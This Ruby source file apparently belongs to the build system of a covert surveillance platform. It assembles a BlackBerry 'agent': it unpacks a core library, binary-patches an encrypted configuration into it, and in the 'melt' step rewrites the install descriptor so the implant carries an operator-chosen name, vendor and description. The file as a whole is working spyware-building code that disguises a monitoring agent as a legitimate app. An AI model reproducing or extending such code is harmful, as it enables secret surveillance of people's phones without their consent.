#
#  Agent creation for blackberry
#

# from RCS::Common
require 'rcs-common/trace'

require 'digest/sha1'

module RCS
module DB

class BuildBlackberry < Build

  def initialize
    super
    @platform = 'blackberry'
  end

  def unpack
    # unpack the core from db
    super

    # save a copy into the 'res' dir for later use in the 'pack' phase
    Dir.mkdir(@tmpdir + '/res')
    FileUtils.mv(path('net_rim_bb_lib.cod'), path('/res/net_rim_bb_lib.cod'))
    @outputs[@outputs.index('net_rim_bb_lib.cod')] = '/res/net_rim_bb_lib.cod'

    # then extract the cod into its parts
    Zip::ZipFile.open(path('/res/net_rim_bb_lib.cod')) do |z|
      z.each do |f|
        f_path = path(f.name)
        FileUtils.mkdir_p(File.dirname(f_path))
        z.extract(f, f_path) unless File.exist?(f_path)
        @outputs << f.name
      end
    end

  end
  
  def patch(params)

    trace :debug, "Build: patching: #{params}"

    # add the file to be patched to the params
    # these params will be passed to the super
    params[:core] = 'net_rim_bb_lib_base.cod'

    # invoke the generic patch method with the new params
    super

    trace :debug, "Build: adding config to [#{params[:core]}] file"

    # blackberry has the config inside the lib file, binary patch it instead of creating a new file
    file = File.open(path(params[:core]), 'rb+')
    file.pos = file.read.index 'XW15TZlwZwpaWGPZ1wtL0f591tJe2b9'
    config = @factory.configs.first.encrypted_config(@factory.confkey)
    # write the size of the config
    file.write [config.bytesize].pack('I')
    # pad the config to 16Kb (minus the size of the int)
    config = config.ljust(2**14 - 4, "\x00")
    file.write config
    file.close
    
  end

  def melt(params)
    trace :debug, "Build: melting: #{params}"

    # read the content of the jad header
    content = File.open(path('jad'), 'rb') {|f| f.read}

    # reopen it for writing
    jad = File.open(path('jad'), 'wb')

    # make substitution in the jad header
    content['[:RIM-COD-Name:]'] = params['name']
    content['[:RIM-COD-Version:]'] = params['version']
    content['[:RIM-COD-Description:]'] = params['desc']
    content['[:RIM-COD-Vendor:]'] = params['vendor']

    content.gsub!('[:RIM-COD-FileName:]', params['jadname'])
    
    jad.puts content
    jad.puts "RIM-COD-Module-Name: #{params['name']}"
    jad.puts "RIM-COD-Creation-Time: #{Time.now.to_i}"

    num = 0
    # each part of the core must be renamed to the new jadname
    # and added to the body of the jad file
    @outputs.dup.keep_if {|x| x['net_rim_bb_lib'] and not x['res']}.sort.each do |file|
      old_name = file.dup
      file['net_rim_bb_lib'] = params['jadname']
      @outputs[@outputs.index(file)] = file
      File.rename(path(old_name), path(file))

      inc = num == 0 ? '' : "-#{num}"

      jad.puts "RIM-COD-URL#{inc}: #{file}"
      jad.puts "RIM-COD-SHA1#{inc}: #{Digest::SHA1.file(path(file))}"
      jad.puts "RIM-COD-Size#{inc}: #{File.size(path(file))}"

      num += 1
    end

    jad.close

    File.rename(path('jad'), path(params['jadname'] + '.jad'))
    @outputs[@outputs.index('jad')] = params['jadname'] + '.jad'
    
    #puts File.read(path(params['jadname'] + '.jad'))
    
  end

  def pack(params)
    trace :debug, "Build: pack: #{params}"

    puts
    puts "PACKING"
    puts

  end

end

end #DB::
end #RCS::
